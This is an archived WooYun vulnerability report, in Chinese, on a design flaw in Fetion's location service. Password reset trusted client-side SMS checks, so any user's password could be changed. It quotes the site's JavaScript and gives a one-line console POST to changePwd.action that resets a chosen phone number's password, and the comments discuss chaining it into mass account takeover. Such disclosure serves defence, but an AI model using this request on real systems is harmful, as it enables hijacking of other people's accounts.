{"id": 9484, "wybug_id": "wooyun-2013-037365", "wybug_title": "飞信位缘某处设计缺陷可修改任意用户密码（非爆破）", "wybug_corp": "139移动互联", "wybug_author": "索马里的海贼", "wybug_date": "2013-09-17 12:16", "wybug_open_date": "2013-09-22 12:17", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-22：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 额。。为什么还有3呢。。。。。 详细说明：  注册 登陆 都绕过了 为什么还有三呢如果是已经注册的用户该怎么弄到他的号呢，找回密码来看看找回密码的逻辑\nfunction stepSubmit(){var phone=$.trim($(\"#phone\").val());var validatecode=$.trim($(\"#validatecode\").val());if(phone==null||phone==\"\"){\talert('请输入手机号');\treturn;}if(validatecode==null||validatecode==\"\"){\talert('请输入验证码');\treturn;}$.ajax({  \turl: '/passport/passport/getPasswordStep.action?flag=phone&validatecode='+$.trim($(\"#validatecode\").val())+'&phone='+$.trim($(\"#phone\").val())+'&match='+Math.random(),   \ttype: \"POST\",   \tsuccess: function(res){    \t\tvar jsonObj = eval(\"(\" + res + \")\");  \t\tvar resData=jsonObj.PasswordResult;\t\tif(resData==\"3\"){\t\t\talert(\"本日内您已经下发3次，请明天再试\");\t\t\treturn;\t\t} else if(resData==\"-1\"){\t\t\talert(\"下发短信失败，请稍后再试\");\t\t\treturn;\t\t}else if(resData==\"0\"||resData==\"1\"||resData==\"2\"){\t\t\talert(\"短信验证码发送成功！\");//下发成功就直接跳了 那不管下发了 直接跟到下一个页面\t\t\twindow.location= '/passport/passport/getpassword1.action?mobile=' + phone;\t\t}else{  \t\t\treload_imaP();\t\t\talert(jsonObj.PasswordResult);\t\t\treturn;  \t\t}\t}})}\n直接打开/passport/passport/getpassword1.action?mobile=13622222222\nfunction validate(){var phoneValidate=$.trim($(\"#mobile\").val());if(phoneValidate==null||phoneValidate==\"\"){alert('请输入手机验证码');\treturn;}$.ajax({   url: '/passport/passport/codeValidate.action?flag=login&value='+$.trim($(\"#mobile\").val())+'&phone='+mobile+'&match='+Math.random(),\t   type: \"POST\",   success: function(res)   {\t  var jsonObj = eval(\"(\" + res + \")\");\t\tvar resData=jsonObj.PasswordResult;\t   if( jsonObj.code == \"false\")\t   {\t\t\t   if(resData==\"1\"){\t\t\t   alert('验证码超时失效');\t\t\t}else{\t   \t\t\t\talert('请输入正确验证码');\t\t\t}\t\t\treturn;\t   }\t   else\t   {\t \t\t   window.location= '/passport/passport/getpassword2.action'; //我去 又直接跳了\t   }   },   failure: function(res){\talert('请输入正确验证码');\treturn;\t}});}\n再跟到下一个页面/passport/passport/getpassword2.action\nfunction changePwd(){var first=$.trim($(\"#newPassword\").val());var second=$.trim($(\"#pnewPassword\").val());//省略var mobile = '13622222222';//省略var params = {};params[\"newpassword\"] = first;params[\"mobile\"] = mobile;$.ajax({  \turl: '/passport/passport/changePwd.action',   \ttype:\"post\",  \tdataType:\"text\",   \tdata:params,   \terror:function () {\t\talert(\"error\");\t},   \tsuccess: function(res){    var jsonObj = eval(\"(\" + res + \")\");  \tvar resData=jsonObj.PasswordResult;  \t\t  \t \tif(resData== \"ok\"){\t\t\t//这。。。我了个去  \t \t\talert(\"修改成功\");  \t \t\t  \t \t setTimeout('jumpPage()',1000);  \t \t}else if(resData== \"false\"){  \t \t\talert(\"修改失败\");\t  \t }else{  \t \t\talert(resData);\t\t}\t}})}\n最后提交修改密码的步骤 只提交了手机号和新密码 短验又无视了   漏洞证明：  直接打开http://lbs.feixin.10086.cn//passport/passport/getpassword2.action其实不打开这个页面都无所谓\n\nf12 console$.post('/passport/passport/changePwd.action', 'mobile=13622222222&newpassword=a!11111111',function(data){alert(data);});\n\n回车走你\n\n这是成功了吧，拿新密码用上一个绕过短验登陆的exp测试 OK 又进去了终于完了 不会有四了 这仨漏洞加一块已经秒杀所有用户了   修复方案：  关键逻辑在服务端做判断   版权声明：转载请注明来源 索马里的海贼@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-09-22 12:17 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-17 12:18 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  @xsser 不是这样的啊。。。。    \n     2013-09-17 12:25 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  你是注定要做海贼王的男淫啊~    \n     2013-09-17 12:26 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @索马里的海贼 虾米意思    \n     2013-09-17 12:27 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  @xsser 他肯定说你们改了他的标题，汪汪汪思密达    \n     2013-09-17 12:28 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  @xsser 三个漏洞连起来看是可以控制所有用户的啊。。。并不是只能修改已知账号的用户 不看前面漏洞的话 厂商可以说你改了密码也没用 登陆还有短验呢。。。。    \n     2013-09-17 12:38 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  @索马里的海贼 前两个不配合这个 是没什么影响的    \n     2013-09-17 12:40 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  @索马里的海贼 你好，私信你了，建议这种多个问题配合才能发挥作用漏洞尽量一起提交    \n     2013-09-17 12:43 |    \t\t无敌L.t.H \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | ‮……肉肉捉活，亭长放解)\t\t \n  飞信位缘这东西本身没啥用，漏洞倒不少……    \n     2013-09-17 12:49 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  @索马里的海贼 在审核时，只见到前两个漏洞确实是无太大影响，如果一定要拆分提交，请注明是多个问题配合利用。    \n     2013-09-17 12:53 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @Finger 编辑辛苦鸟    \n     2013-09-17 12:58 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  PS：请大家谅解，需要审核的漏洞量很大，在审核的过程中或多或少会有疏忽或误判的地方，如果有什么问题及疑问可以私信我。    \n     2013-09-17 13:17 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  @Finger 主要是把JS丢上来 3个写一块儿的话太长 因为是三个问题 所以拆开写了前两个也不是完全没影响 至少说绕过正常的逻辑了就是安全问题吧。    \n     2013-09-17 13:21 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  我看出来了 @Finger比@xsser有用 哈哈    \n     2013-09-18 11:10 |    \t\tterrying \t\t\t( 实习白帽子  |\t\t\t        Rank:59 漏洞数:15        | 雅蠛蝶)\t\t \n  目测洞主是****    \n     2013-09-23 17:40 |    \t\tEnjoy_Hacking \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:8        | 时间无言，如此这般。)\t\t \n  索马里的海贼。。以前WOW吧吧主的ID。。。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}